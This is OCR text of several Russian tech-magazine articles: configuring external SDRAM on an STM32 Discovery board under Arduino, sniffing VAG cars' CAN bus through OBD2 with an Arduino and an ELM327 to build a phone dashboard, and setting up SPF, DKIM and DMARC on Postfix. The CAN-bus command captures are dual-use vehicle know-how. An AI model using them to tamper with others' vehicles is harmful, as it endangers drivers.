    НА МАКСИМАЛКАХ
            ЗАВОДИМ И РАЗГОНЯЕМ ОПЕРАТИВНУЮ
                     ПАМЯТЬ НА STM32 И ARDUINO





             INFO

                Мы потратили немало времени, листая даташит
                       на память и выясняя, с какими настройками ее
                      нужно  запускать. Но  откуда  эту информацию
                       берет обычный персональный компьютер, ведь
                      там план ки памяти — это прак тически plug & play?
                       Оказывается, помимо нескольких микросхем
                      оперативной памяти, на каждой планке допол‐
                        нительно присутствует энергонезависимая SPD
                    EEPROM. Именно она хранит значения частоты
                      и таймингов и сообщает их системе по пос‐
                       ледовательному интерфейсу SMBus (аналог I2C).


В функции fmc_init зна чения таймингов гарантированно рабочие и потому
несколько завышены. Забегая вперед, скажу, что у меня получалось запус‐
тить плату с TRAS=4 и TXSR=7 без каких‐либо ошибок. От знакомых слышал,
что и это не предел и раз гонять можно и дальше. Но уже разве что из спор‐
тивного интереса — особого прирос та тут не получить.


ЗАПУСКАЕМ SDRAM
Предыдущие две функции нас тра ивали перифе рию только на самом контрол‐
лере. Теперь пришло время «пробудить» микросхему SDRAM и послать ей
стартовые команды. Весь про цесс детально описан на странице 35 докумен‐
тации на оперативную память. В коде это выглядит следующим образом:


#define CAS_POS  (4)
#define CAS_2    (2 << CAS_POS)
#define CAS_3    (3 << CAS_POS)


#define MODE_REG_POS (9)
#define MODE_REG     (CAS_2 << MODE_REG_POS);


#define REFRESH_RATE (1665)


static inline void sdram_init() {
  /* Clock Configuration Command */
  FMC_Bank5_6 ‐> SDCMR = FMC_SDCMR_CTB1 | FMC_SDCMR_MODE_0;


  while (FMC_bank5_6 ‐> SDSR & FMC_SDSR_BUSY) {
    /* wait until FMC is ready */
  }


  __WFI(); /* now wait until SDRAM is ready (~100 us) */


  /* Precharge All Command */
  FMC_Bank5_6 ‐> SDCMR = FMC_SDCMR_CTB1 | FMC_SDCMR_MODE_1;


  while (FMC_bank5_6 ‐> SDSR & FMC_SDSR_BUSY) {
    /* wait until FMC is ready */
  }


  /* Auto Refresh Command x4 */
  FMC_Bank5_6 ‐> SDCMR = FMC_SDCMR_NRFS_1 | FMC_SDCMR_NRFS_0 |
                         FMC_SDCMR_CTB1 | FMC_SDCMR_MODE_1 |FMC_SD
CMR_MODE_0;


  while (FMC_bank5_6 ‐> SDSR & FMC_SDSR_BUSY) {
    /* wait until FMC is ready */
  }


  /* Load Mode Register Command (CL = 2) */
  FMC_Bank5_6 ‐> SDCMR = MODE_REG | FMC_SDCMR_CTB1 | FMC_SDCMR_MODE_2;


  while (FMC_bank5_6 ‐> SDSR & FMC_SDSR_BUSY) {
    /* wait until FMC is ready */
  }


  /* Set Refresh Rate for SDRAM */
  FMC_Bank5_6 ‐> SDRTR |= REFRESH_RATE << 1;
}

Блок FMC выкинет на шину памяти несколько команд, сре ди которых нас
больше всего интересуют ровно две: загрузка регис тра режима (Mode Regis‐
ter) и таймера регенерации (Refresh Timer). Регистр режима выглядит так.





Большинство комбинаций битов  тут зарезервировано (очень интерес но,
зачем), а оставшиеся вполне можно оставить по умолчанию. Главное —
не забыть выставить параметр CAS Latency, который определяет количество
тактов между отправкой команды на чтение и появлением данных на шине.
   Также следует указать, как час то данные в SDRAM нужно обновлять, ведь
ячейки динамической памяти пос троены на основе конденсаторов и имеют
свойство разряжаться со временем. Для это го сверимся с документацией
на FMC (с. 379) и воспользуемся калькулятором.





Все, самое сложное теперь позади! Дос таточно только вызывать функцию
xmem_init в setup и нас троить SDRAM. С нашей микросхе мой уже можно
работать, и сейчас лучший момент проверить  это, записав что‐нибудь
в память по новым адресам. Если не случилось никакого Bus Error (с экс‐
траполяцией до Hard Fault), то прими мои зас лужен ные поз дравления.


ПРАВИМ LDSCRIPT
Уже на этом этапе мы можем работать с внеш ней памятью примерно таким
образом:


#define BR_IN_SIZE    (0x2000)
#define BR_OUT_SIZE   (0x2000)
#define INPUT_SIZE    (0x8000)
#define BUFFER_SIZE   (0x8000)


#define BR_IN_OFFSET  (0xC00FF000)
#define BR_OUT_OFFSET (BR_IN_OFFSET + BR_IN_SIZE)
#define INPUT_OFFSET  (BR_OUT_OFFSET + BR_OUT_SIZE)
#define BUFFER_OFFSET (INPUT_OFFSET + INPUT_SIZE)


static uint8_t *const iobuf_in   = (uint8_t *const)BR_IN_OFFSET;
static uint8_t *const iobuf_out  = (uint8_t *const)BR_OUT_OFFSET;
static uint8_t *const input      = (uint8_t *const)INPUT_OFFSET;
static uint8_t *const buffer     = (uint8_t *const)BUFFER_OFFSET;

Это кусочек кода с буфера ми ввода‐вывода для биб лиотеки bearSSL из моей
предыдущей статьи. Так как операции с мас сивами — это час тные случаи
арифметики указателей, все реализует ся дос таточно просто. Однако такое
использование памяти чревато проблемами — стоит только опечататься
в адресах или размерах мас сивов, и следующие несколько часов придется
потратить на исправление глупой ошиб ки.
  Облегчить себе жизнь можно, если добавить в программу менеджер
памяти. Или взять сущес твующий. Ты наверняка уже догадался, что дальше
речь пойдет о библиотечной функции malloc. Именно она возьмет на себя
всю низкоуровневую работу с памятью и адресами, позволив нам сконцен‐
трироваться на более важных вещах.
  Изначально куча размещается в той же области внутренней SRAM, что
и стек. Если получится перекинуть кучу во внешнюю память, то malloc начнет
раздавать адреса оттуда. Это удобно, так как, во‐первых, у нас освободится
больше места под стек, во‐вторых, менеджер памяти сможет нарезать нам
кусочки целыми мегабайтами.
  Для этого нам нужно добавить новую область памяти в скрипт загрузчика.
В файлах Arduino по адресу packages/STM32/hardware/stm32/1.5.0/vari‐
ants/DISCO_746NG ищем ldscript.ld и откры ваем его в любом текстовом
редакторе (исходную версию предварительно все же лучше сохранить).
Перед секциями там указаны типы памяти в нашей системе. Исправляем на


/* Specify the memory areas */
MEMORY
{
  RAM (xrw)      : ORIGIN = 0x20000000, LENGTH = 320K
  FLASH (rx)      : ORIGIN = 0x8000000, LENGTH = 1024K
  SDRAM (xrw)     : ORIGIN = 0xC0000000, LENGTH = 8M
}

После этого ищем опи сание секции user_heap_stack. Оно выглядит как‐то
так:


/* User_heap_stack section, used to check that there is enough RAM left
*/
._user_heap_stack :
{
  . = ALIGN(8);
  PROVIDE ( end = . );
  PROVIDE ( _end = . );
  . = . + _Min_Heap_Size;
  . = . + _Min_Stack_Size;
  . = ALIGN(8);
} >RAM

Здесь происходит выравнивание данных по адресам в памяти и экспорт нес‐
кольких дополнительных переменных для компилято ра. Это все уже не тре‐
буется, поэтому удаляем секцию полностью и пишем следующее:


/* User heap section */
._user_heap :
{
  PROVIDE ( _heap_min = . );
  PROVIDE ( _heap_max = _heap_min + LENGTH(SDRAM));
} >SDRAM

Теперь куча будет размещаться во внешней микросхе ме памяти, но нам
еще нужно научить функцию malloc работать с новыми адре сами. Править ее
исходники было бы несколько опрометчиво (вот здесь ты можешь оценить
примерный масштаб проблемы), да это и не требуется. Мы зайдем с дру гой
стороны и обратимся к функции sbrk, от которой зависит malloc.


РЕАЛИЗУЕМ SBRK
Сегодня вряд ли можно встретить человека, который порекомендует исполь‐
зование системного вызова sbrk в новых прог раммах. Скорее наоборот, вся‐
чески посове тует держаться от него как можно даль ше. Это разумно, это пра‐
вильно, но во встраиваемых системах своя специфика, поэтому тут sbrk
не только используют, но еще и правят от случая к случаю.
  Прежде всего стоит взгля нуть на файл syscalls.c, который можно най ти
по  адресу  packages/STM32/hardware/stm32/1.5.0/cores/arduino.  Тут
находится реализация sbrk по умолчанию, от нее и будем отталки ваться.
Атрибут weak намекает, что в своих проектах эту функцию можно пере опре‐
делять без последствий.
  Создаем скетч в Arduino и добавляем новый файл sbrk.c. Пишем внутри:


#include <sys/stat.h>
#include <errno.h>


extern char _heap_min;
extern char _heap_max;
extern int errno;


caddr_t _sbrk(int incr) {
  static char *current = &_heap_min;
  char *previous = current;


  if (current + incr > (char*)&_heap_max) {
    errno = ENOMEM;
    return (caddr_t) ‐1;
  }


  current += incr;
  return (caddr_t) previous ;
}

Теперь функция malloc из стандартной биб лиотеки будет зависеть уже
от нашей реализации системного вызова. А мы сделали все для того, чтобы
он раздавал адреса из нужного диапа зона [0xC0000000, 0xC07FFFFF]. Пос‐
леднее неудобство заключа ется в том, что в каждой нашей программе,
которая использует внешнюю SDRAM, нам необ ходимо вызывать xmem_init
в setup перед динамическим рас пределением памяти. Иначе сказка закон‐
чится и карета превратится в тыкву зна чительно рань ше полуночи. В смысле
malloc вернет нулевой ука затель, разумеется.
  Об этом тяжело помнить каж дый раз и очень легко забыть, поэтому проще
будет вставить инициализацию памяти до того момента, как управление
перейдет к пользователь скому коду.


ДОБАВЛЯЕМ В MAIN
Проблема заключается в том, что функция main у нас одна для всех плат
из пакета STM32duino, а Discovery F746 со своей внешней SDRAM в этом пла‐
не уникальна. Поэтому придется вводить допол нительные условия при ком‐
пиляции скетча.
  Снова идем по адресу packages/STM32/hardware/stm32/1.5.0/vari‐
ants/DISCO_746NG (в этой папке мы уже правили скрипт загрузчика). Откры‐
ваем заголовочный файл платы variant.h и добавляем в любое место строч‐
ку с новым определе нием:


#define EX_SDRAM

Далее переходим в папку packages/STM32/hardware/stm32/1.5.0/cores/
arduino. Ищем main.cpp, в него предстоит внести заключительные изме‐
нения, чтобы все зарабо тало. Во‐первых, добавляем файл xmem.h с объявле‐
нием функции инициализации:


#ifdef EX_SDRAM
  #include "xmem.h"
#endif

И вставляем ее вызов прямо перед setup:


#ifdef EX_SDRAM
  xmem_init();
#endif

Кстати, если ты обратишь внимание на остальной код в main, то заметишь,
что конфигурация интерфейса USB на некото рых платах устроена по такому
же принципу.


ЗАКЛЮЧЕНИЕ
В этой статье мы научили Arduino работать с внешней памятью для платы
на STM32. Дополнительные нес колько мегабайт придутся очень кстати, если
ты захочешь использовать дисплей или подключить камеру.
  Но пожалуй, мы добились не только этого. Надеюсь, теперь ты наверняка
лучше представляешь работу оперативной памяти в своем компьюте ре:
как она устроена и как рас считываются зна чения таймингов и периоды
регенерации ячеек.
ТРЮКИ
 YOU CAN





       ПРЕВРАЩАЕМ ТЕЛЕФОН
        В ПАНЕЛЬ ПРИБОРОВ
           АВТОМОБИЛЯ




На смену  клас сическим  автомобильным
приборам  приходят  цифровые  панели.
Наверное,  самая  популярная  машина
с такой панелью — это Tesla с ее вну‐
шительным сенсорным дисплеем. На нем          Виталий Юркин                                                                                   Инженер‐программист
можно следить за маршрутом, управлять             aivs@yandex.ruумного дома
музыкой   и   видеть   диаг ностическую
информацию. А знаешь ли ты, что в бюд‐
жетных авто используются те же электрон‐
ные блоки? Информа цию с них можно счи‐
тать и показать. Давай попробуем это сде‐
лать.





          Семнадца тидюймовый сенсорный дисплей Tesla

Раньше на панель приборов выводилась только основная информация: обо‐
роты, скорость, температура. Сейчас можно вывести любые данные, какие
пожелаешь: видео с камеры под бампером, дорожные знаки, график расхода
топлива.
   Автомобиль — это большая компьютер ная сеть, в которой множес тво дат‐
чиков и исполнительных механизмов. Но информацию об их работе можно
посмотреть только с помощью специального диаг ностичес кого оборудо‐
вания.





                        Электронные бло ки

Чем дороже машина, тем больше полезной информации отображается
на штатном бортовом компь ютере.


ИЗУЧЕНИЕ ВОЗМОЖНОСТЕЙ
В современных автомобилях используется шина СAN для связи датчиков,
кнопок, исполнительных устройств и блоков управления. Каждый датчик,
который передает информацию, в каж дом сооб щении указывает свой ID. Все
другие устройства на шине видят эти сооб щения и сами решают, реагировать
на них или нет.
  Например,  датчик  температу ры  охлажда ющей  жид кости  передает
информацию, блок управления двигателем учи тывает ее в своей работе,
а панель приборов отоб ражает температуру двигателя.





Чтобы получить информацию о работе систем авто мобиля, нужно подклю‐
читься к CAN. Есть несколько способов подключения.
 1. Подклю читься непос редственно к проводам внутри машины. Этот способ
   требует частичной разборки авто.
 2. Подклю читься в диагностический разъ ем OBD2.

В автомобилях группы VAG (Volkswagen, Audi, Škoda, Seat) разъем OBD2 под‐
клю чен к шине CAN через шлюз: прямого дос тупа к ней нет. Это означает, что
если попытаться послушать команды в разъеме OBD2, то ничего не получит‐
ся. Шлюз не пропускает команды из основной сети в диагностический разъ‐
ем. Но есть официальный диагностичес кий комплекс VCDS, который поз‐
воляет через OBD2 видеть все датчики, читать ошибки и настраивать обо‐
рудование.
  Работает он просто: VCDS для каж дого датчика запрашивает у шлюза
информацию о его состоянии;  когда шлюз получает  ее, он передает
информацию в OBD2.





Итак, если подслушать, что запрашивает VCDS, мож но будет получить список
команд для опроса датчиков.


СНИФФЕР ШИНЫ CAN
На основе Arduino Uno и модуля TJA1050 Niren с CAN‐контроллером MCP2515
я собрал сниффер, который подключается в любое место в шине CAN и слу‐
шает пролетающий трафик. При этом сниффер никак не мешает работе сис‐
тем. Чтобы подслушать, что отправляет VCDS, нужно подпаяться в сам диаг‐
ностический кабель к пинам CAN‐High и CAN‐Low.





После подключения кабеля в разъем OBD2 можно наблюдать весь трафик
между шлюзом и VCDS с помощью программы CANHackerV2. Для Arduino
есть специальный скетч, он принимает данные по CAN и отправляет через
преобразователь UART → USB в формате, который понимает CANHackerV2.
Скетч находится в открытом доступе и лежит на GitHub.





Прослушав отправленные VCDS команды, я сформировал список команд,
которые можно запрашивать у машины.

Двери:
 • 714 03 22 22 0D 55 55 55 55 — запрос;
 • 77E 05 62 22 0D 55 65 AA AA — все двери закрыты;
 • 77E 05 62 22 0D 00 65 AA AA — все двери откры ты.

Уровень топлива:
 • 714 03 22 22 06 55 55 55 55 — запрос;
 • 77E 04 62 22 06 2C AA AA AA — 44 лит ра;
 • 77E 04 62 22 06 16 AA AA AA — 22 лит ра.

Температура масла:
 • 714 03 22 20 2F 55 55 55 55 — запрос;
 • 77E 04 62 20 2F 36 AA AA AA — –4 °С;
 • 77E 04 62 20 2F 67 AA AA AA — 45 °С.

Теперь нужно понять, есть ли способ получать эти данные без официального
диагностического оборудования, чтобы затем их отоб ражать.


ДИАГНОСТИЧЕСКИЙ СКАНЕР ELM327
С 1996 года все автомобили должны поддержи вать спе цификацию OBD2,
которая предусматривает 16‐пиновый разъем. Разъем OBD2 обязан быть
в районе рулево го колеса или где‐то непода леку. В спецификацию также вхо‐
дит стандартный набор команд, который должны поддерживать все авто‐
мобили.





Многие автолюбители зна ют о недорогом диагности чес ком сканере ELM327,
который позволяет для любого автомобиля — по протоколу OBD2 — провес‐
ти первичную диагностику, считать ошиб ки, сбросить ошибки, а также зап‐
росить некоторую информа цию у бло ка управления двигателем: скорость,
обороты, температуру, пропуски зажига ния.





                           ELM327

Программ для работы с базовыми функци ями ELM327 хватает. Но только раз‐
работчики знают, что потенциал ELM327 гораздо больше. ELM327 поддержи‐
вает работу с двенадцатью раз личными протоко лами, в том числе и ISO
15765‐4 CAN. Это означает, что диагностический ска нер может получить дос‐
туп к шине CAN и общаться с ней.
   Чтобы ELM327 мог отправлять запросы и получать данные через шину
CAN, нужно его настроить. Для это го подключаемся к UART‐консоли сканера
по Wi‐Fi, Bluetooth или с помощью провода и отправляем набор команд
AT согласно документации на ELM327.
 • atz — сброс всех нас троек;
 • at e0 — отклю чаем эхо;
 • at sh 714 — ID, к которому будем отправлять запрос;
 • at cra 77e — ID, с которо го будем получать ответ;
 • at fc sh 714 — вклю чить Flow control для ID 714;
 • at fc sd 30 00 00 — задать данные для Flow control;
 • at fc sm 1 — режим Flow Control, ког да юзер задает ID и данные;
 • at al — разрешить длинные сообщения, больше 7 байт;
 • at sp 6 — протокол общения ISO 15764‐4 CAN (11 бит ID, 500 кБод);
 • at ca f0 — отключить автоматическое форматирование CAN;
 • at l0 — отклю чаем перенос.

После настройки ELM327 сделаем тес товый запрос. Запрашиваем тем‐
пературу масла (03 22 22 0D 55 55 55 55) и получаем ответ: 05 62 22 0D
55 65 AA AA.
  Сообщения в шине CAN переда ются со скоростью 500 кБод, это очень
быстро. ELM327 работает намного медленнее, среднее время на зап‐
рос‐ответ — 50 мс, за одну секунду можно сделать всего двадцать запросов.
Это нужно учитывать при разработке приложения, которое будет опрашивать
датчики и выводить информа цию на экран.


РАЗРАБОТКА ПРИЛОЖЕНИЯ ПОД IPHONE
Многие автопроизводители выпус кают мобильные приложения, которые поз‐
воляют дистанционно запус кать двигатель, вклю чать климат‐контроль, сле‐
дить за уровнем топлива.





Я решил разработать приложение для телефона или планшета, которое смо‐
жет выполнять функции приборной панели автомобиля.
   Разработка приложения будет вестись под iOS, но для Android алгоритмы
работы с ELM327 те же. Для раз работки приложений под iOS требуется
Xсode. Сейчас на выбор у раз работчика есть два официально поддержи‐
ваемых языка программирования: Objective‐C и Swift. Последний новее, про‐
ще и лучше защищен от ошибок.





                              Xcode

В первой версии приложения главное — создать ста бильную основу для ком‐
муникации с Wi‐Fi ELM327 сканером, чтобы затем было легче расширять
набор функций приложения.
  Фреймворк CocoaAsyncSocket прост в использовании и стабилен, он
работает напрямую с сокетами по про токолу TCP и UDP. С его помощью мож‐
но начать соединение, отправлять и получать данные, закрывать соеди нение.





После отладки кода общения с ELM327 можно переходить к разработке
самого интерфейса виртуальной панели. Дизайн приложения не должен
отвлекать от дороги, но в то же время должен быть информативен и легко
читаем.





Разместив виджеты датчиков на Storyboard, нужно соединить их с кодом.
В Xсode это делается с помощью соединительных линий. После этой опе‐
рации при обновлении датчика его значение будет записано в переменную
и отобразится на виджете.





Основа для приложения готова. Сейчас приложение показы вает откры тые
двери и основные данные параметров автомобиля.





Подрулевой перек лючатель TRIP при долгом удержании меня ет стиль отоб‐
ражения приборов.





Я протестировал приложение на нескольких автомобилях:
 • Škoda Octavia A5 2011 Ambiente;
 • Škoda Octavia A5 2012 L&K;
 • Škoda Yeti 2011 Ambiente;
 • Škoda Octavia A7 2014 Elegance.

На последнем отоб ража ется только часть параметров. Приложение должно
работать и с другими моделями груп пы VAG (Volkswagen, Audi, Škoda, Seat).


ИТОГ
Сначала проект задумывался как исследователь ский. Было инте ресно узнать,
как работают электронные системы авто мобиля и как можно улучшить их
работу. Получен ные знания поз волили раз работать прос тое мобильное при‐
ложение, которое может попробовать каждый.


        WWW

                     •Посмотреть  на  YouTube,  как  приложение
                         работает в реальности
                     •Скачать приложение из App Store (для работы
                        нужен только диагностический сканер ELM327)
АДМИН

   ЗАЩИЩАЕМ
ПОЧТОВЫЙ СЕРВЕР
  БЕЗ АНТИВИРУСА

          НАСТРОЙКА DKIM‐,
             SPF‐ И DMARC‐
             ЗАПИСЕЙ





                                        Иван Пискунов




Электронная почта — один из самых популярных каналов
распространения спама, малвари и фишинговых ссылок.
Существует куча софта, который защищает почтовые сер‐
веры от этих напастей, да вот незадача: большинство таких
программ стоит денег, и порой немалых. В этой статье я
расскажу, как уси лить безопасность корпоративных поч‐
товых серверов (MS Exchange и Postﬁx) с помощью дос‐
тупных штатных средств — DKIM‐, SPF‐ и DMARC‐записей,
не требующих использования дорогостоящих коммерческих
продуктов.


НЕМНОГО ТЕОРИИ О ТОМ, ЧТО МЫ БУДЕМ НАСТРАИВАТЬ
Итак, прежде чем мы приступим непос редс твенно к изменению настроек
безопасности нашего почтового сервера, нужно разобраться с тем, что
именно мы собираемся нас тра ивать. Если тебя не пугают страшные на вид
аббревиатуры, состоящие из трех и более заглавных букв латинского алфа‐
вита, ты можешь пропус тить этот раздел. Осталь ных приглашаю освежить
свои знания, ибо повторение, как гласит народная мудрость, мать учения.


           WARNING

                    Важно помнить,  что,  к сожалению, настройка
                        DKIM‐,  SPF‐  и  DMARC‐записей  не  панацея
                         от всех бед. Если почтовый сервер был взломан,
                        эти фун кции безопасности не смогут защитить
                         от  нелегитимного  трафика.  Поэтому  важно
                       заранее  продумать  эшелонированную  защиту
                       системы, включая антиспам‐фильтры, антивирус‐
                      ное детектирование и прочее.



Что такое DKIM?
DKIM (Domain Keys Identified Mail) — это, условно говоря, цифровая
подпись, которая подтверждает подлинность отправителя и гарантирует
целостность доставленного письма. Подпись добавляется в слу жебные
заголовки сообщения и оста ется незаметной для самого пользовате ля. Пос‐
кольку в DKIM используется асимметричная сис тема шифрования, репози‐
торий сервера всегда хранит два клю ча шифрования — откры тый (сер‐
тификат) и закрытый. С помощью закрытого ключа формиру ются заголовки
для всей исходящей почты, а открытый ключ как раз добавляется в DNS‐
записи в виде TXT‐файла.
   Статус DKIM проверя ется автоматически на сто роне получателя при сох‐
ранении письма в контейнер (именной почтовый ящик). И если домен в пись‐
ме не авторизован для отправки сообщений, то письмо может быть помечено
подозрительным или же сразу помещено в папку «Спам», в зависимости
от настроенной политики безопасности. Кстати, это одна из ключевых при‐
чин, почему письма определенных отправителей постоянно попадают в спам,
даже несмотря на валидность домена отпра вителя.
  Для работы с DKIM требуется выполнение следующих условий:
 • поддержка DKIM почтовым сервером (а она есть у всех современных поч‐
   товиков);
 • создание приватного и публичного ключа шифрования (это нужно сде лать
   ручками);
 • занесение в DNS домена записей, связанных с DKIM (и это тоже ручками).





                      Принцип работы DKIM


             INFO

                     Для интересующихся этой темой в нашем жур‐
                       нале публиковался краткий гайд «Как настро ить
                       почтовый  сервер  для  обхо да  спам‐фильтров:
                       руководство  по  DNS,  SPF,  DKIM»,  который
                      поможет тебе взглянуть на проблему рассылки
                       спама, вредоносного ПО и фишинга глазами вла‐
                       дельца почтового ботнета. :)



Что такое SPF?
SPF (Sender Policy Framework) — это еще одна специальная под пись,
содержащая информацию о серверах, которые могут отправлять почту с тво‐
его домена. То есть SPF поз воляет владельцу домена указать в TXT‐записи
для DNS‐домена специальным образом сформированную строку, содер‐
жащую весь список серверов, которые имеют пра во отправлять email‐сооб‐
щения с обратными адресами в этом домене. А если сказать то же самое
понятными словами, то в этой записи мы сооб щаем, с каких почтовых сер‐
веров можно посылать письма от имени сотрудни ков нашей компании. Воу!
Вот так просто! В общем, наличие SPF снижает вероятность, что твое письмо
попадет в спам.
  Важно помнить, что SPF‐запись должна быть только одна для одного
домена, хотя уже в рамках одной SPF может содержаться нес колько записей.
И надо сказать, что для поддоменов будут нужны свои записи. И никак иначе!
Безопасность требует времени и усердия. :)





                      Принцип работы SPF


Что такое DMARC?
DMARC (Domain-based Message Authentication, Reporting and Con-
formance) — это еще одна подпись, которая поз воляет серверу получателя
принять решение, что делать с пришедшим пись мом. Важно заметить, что
DMARC — это скорее дополнитель ная фича к уже используемым DKIM и SPF.
Например, если отправленное сообщение не прошло проверку DKIM и SPF,
то оно не пройдет и DMARC. Все логич но. А вот если письмо успешно прош‐
ло хотя бы одну проверку (DKIM или SPF), то и про верку DMARC оно тоже
преодолеет. Также при помощи DMARC можно получать репорты от почтовых
систем с информацией, сколько через них пыталось пройти или прошло под‐
дельных сообщений на ваш домен. Из ска занного становится понятно, что
DMARC добавляется только после того, как уже настроены записи SPF
и DKIM.





                     Принцип работы DMARC


От чего нельзя защититься с помощью DKIM, SPF и DMARC
С использованием DKIM, SPF и DMARC можно противостоять email‐спуфингу
и распространению малвари. Однако важно понимать, что это не гарантирует
безопасности в случае взлома сервера, нап ример путем компрометации
админки или применения экс пло ита, а также если письма форвардятся через
иные почтовые сервисы с сомнитель ной репута цией или с пол ностью отсутс‐
твующими записями DKIM, SPF и DMARC.


Некоторые полезные ссылки для про верки корректности настройки DKIM‐
и SPF‐записей, а также репута ции домена:
 • SPF Policy Tester — онлайн‐сервис про верки корректности SPF‐записи.
  Для проведе ния теста на сайте указыва ешь почтовый адрес, с которого
   хочешь отправлять пись ма, и IP‐адрес почтового сервера. Если все
   хорошо, то после нес кольких секунд ожидания внизу страницы должна
   появиться зеленая надпись PASS.
 • Dkimvalidator.com — раз работчики этого сервиса дают тебе адрес почты,
   на который нужно выслать пись мо. После этого можно просмотреть отчет
  о валидности DKIM. Все просто!
 • Mail‐tester.com — еще один вариант аналогичного сервиса, где тебе пре‐
   доставляется адрес поч ты для отправки тес тового сообщения, а пос ле
   этого можно посмотреть отчет о доставке. Если возникли проблемы,
   из представленного репорта можно понять, в чем именно заключаются
   косяки.

Также не стоит забывать о регистрации своего сервера в службах постмас‐
тера для публичных почтовых серверов (если ты, конечно, администрируешь
такой сервер). Это поз волит тебе не только получать статистику по рас‐
сылкам, но и зарабо тать чуть больше доверия от этого почтового сервиса.
Вот самые известные и час то используемые пос тмастеры: Mail.RU, Yandex
и Gmail.



ПРАКТИКА И ЕЩЕ РАЗ ПРАКТИКА
В практической части мы рас смот рим конфигурирование описанных выше
настроек безопасности на примере двух наиболее популярных почтовых сер‐
веров — опенсорсного Postﬁx на Debian (ну, или Ubuntu Server) и проприетар‐
ного Microsoft Exchange Server 2013+. Предполага ется, что почтовые серверы
у тебя уже установлены и настроены под твой домен, поэтому рассматривать
будем только само конфигурирова ние фич на обез личенных данных.


Настраиваем SPF, DKIM и DMARC на Postfix (Debian)
Общий принцип работы нашего почтового сервера будет таков:
 1. Принимающий сервер получает письмо с адреса info@example.com,
   отправленное с сервера mx.example.com.
 2. Сервер получателя делает запрос к DNS для домена example.com и ищет
   записи SPF и DKIM.
 3. В случае если записей нет, пись му проставляется статус neutral (конкретно
   по этим проверкам) и письмо проверя ется дополнительными фильтрами.
 4. В случае если записи обнаружены, про веря ется, раз решено ли серверу
   mx.example.com отправлять почту домена example.com.
 5. Если домен mx.example.com не найден  в списке разрешенных,  то
   или письмо отбрасывается, или ему уста навливается статус neutral.
 6. Если домен mx.example.com таки найден в списке разрешенных, письму
   устанавливается статус Pass и повышается его рейтинг при прохождении
   других фильтров.

Ну что, погнали!


           WARNING

                    Перед любыми операциями по конфигурирова‐
                    нию системы не забывай сделать бэкап! Даже
                      одна неп равильно включенная опция может отре‐
                         зать всех пользовате лей от получения и отправки
                       почтовой корреспон денции. И обязательно тес‐
                       тируй все изменения перед перено сом в их про‐
                        дакшен!



Настройка SPF-записи
Если ты отправляешь все сооб щения только с одного сервера (почтовые кли‐
енты не считаются), то в SPF‐записи будет достаточно указать IP‐адрес этого
сервера:


example.com. IN TXT "v=spf1 +a +mx ip4:31.34.56.78 ‐all"

Описание опций:
 • v=spf1 — используемая версия SPF;
 • + — принимать корреспонденцию  (Pass). Этот параметр установлен
   по умолчанию. То  есть, если  никаких параметров не  установлено,
   это автоматически Pass;
 •  — отклонить (Fail);
 • ~ — мягкое откло нение  (SoftFail). Письмо будет принято, но будет
   помече но как спам;
 • ? — нейтральное отно шение, то есть никаких действий не пред принимать;
 • mx — вклю чает в себя все адреса серверов, указанные в MX‐записях
   домена;
 • ip4 — опция позволяет указать конкретный IP‐адрес или подсеть IP‐адре‐
   сов;
 • a — указываем поведение в случае получения письма от конкретного
   домена;
 • include — вклю чает в себя хос ты, раз решенные SPF‐записью указанного
   домена;
 • all — все остальные серверы, не перечисленные в SPF‐записи.

А теперь, используя эту шпаргалку, расшифру ем то, что указано в нашей
записи:
 • +a — разрешает прием писем от узла, IP‐адрес которого совпадает с IP‐
   адресом в A‐записи для mydomen.ru;
 • +mx — разрешает прием писем, если отправляющий хост указан в одной
   из MX‐записей для mydomen.ru;
 • ip4: — это не что иное, как IP‐адрес нашего собс твенного почтового
   сервера;
 • all — все сооб щения, не прошедшие верификацию с использованием
   перечисленных механизмов, будут отброшены.

Вот, в принципе, и все! Никаких плясок с буб ном и сотен строк скриптового
кода, нужно только прописать пра виль но указанную строку и радоваться жиз‐
ни ленивого сисадмина.


Про верка коррек тности вне сен ных SPF-записей
Обновление DNS‐записей обычно занимает некоторое время. В зависи мос‐
ти от твоей локации и загруженности серверов может пройти от 30 минут
до одних суток.
   Итак, чтобы проверить корректность нашей записи, идем на ресурс Mx‐
ToolBox и вбиваем доменное имя, для которо го только что прописали SPF.
Жмем кнопку SPF Record Lookup и смотрим на результат.





                MxToolBox — сервис про верки SPF‐записи


Настройка DKIM-записи
Для начала на нашем почтовом сервере необходимо установить пакет opend‐
kim, поскольку именно он отвечает за возможность конфигурирования DKIM.
Для этого от имени суперпользователя отда дим в терминале следующие
команды:


$ apt‐get update
$ apt‐get install opendkim opendkim‐tools

Далее создадим директории, где будут хра нить ся клю чи для каждого домена
(если почтовый сервер обслуживает несколько доменов):


$ mkdir /etc/opendkim/keys/
$ mkdir /etc/opendkim/keys/example.com/
$ mkdir /etc/opendkim/keys/example.org/

Потом в обязательном порядке соз даем ключи для наших доменов и селек‐
тор (в нашем примере используется домен example.com и example.org,
а селектор mail. Селектор может быть любой. По сути, это все го лишь наз‐
вание для ссылки на ключ):


$ opendkim‐genkey ‐D /etc/opendkim/keys/example.com/ ‐d example.com
‐s mail
$ opendkim‐genkey ‐D /etc/opendkim/keys/example.org/ ‐d example.org
‐s mail

Приведенная выше команда соз даст файлы /etc/opendkim/example.com/
mail.private  и  /etc/opendkim/example.com/mail.txt  (и  аналогично
для каждого домена), с секретным и публичным клю чами соответственно.
  Файл mail.txt (для соот ветс тву ющего домена) содержит публичный ключ
(сертификат), который надо разместить на DNS‐сервере в TXT‐записи
для того домена, для которого он был соз дан.
  Пример данной записи:


mail._domainkey IN TXT "v=DKIM1;k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUA
dfmWEGERbLGARxEFI9Ibwx79tk1kMi36rFeAT4aLu4iI3ctPUWa7y0WcuMZGCBQ
MMutolT8IM9EGEHYT/rbKlhoeiA0r8qJZiIX/NkjkLIXzR+9h1i47dD5zCu4uE
FWRHETJAERWGQaC9hSHCcCwzosSRwBpaxIMZuRGQIDAQAB"

Владельцем ключей обя зательно ука зываем opendkim: если этого не сделать,
иногда в работе сервера воз ника ют ошиб ки. Для этого пишем в консоли
от рута:


$ chown opendkim:opendkim ‐R /etc/opendkim/keys

Теперь создадим еще три необходимых фай ла конфигурации:


$ touch /etc/opendkim/KeyTable
$ touch /etc/opendkim/SigningTable
$ touch /etc/opendkim/TrustedHosts

Содержимое файла /etc/opendkim/KeyTable (здесь все слова mail меня ем
на наш селектор, в данном файле прописываются домены и пути к секретным
клю чам):


mail._domainkey.example.com example.com:mail:/etc/opendkim/keys/
example.com/mail.private
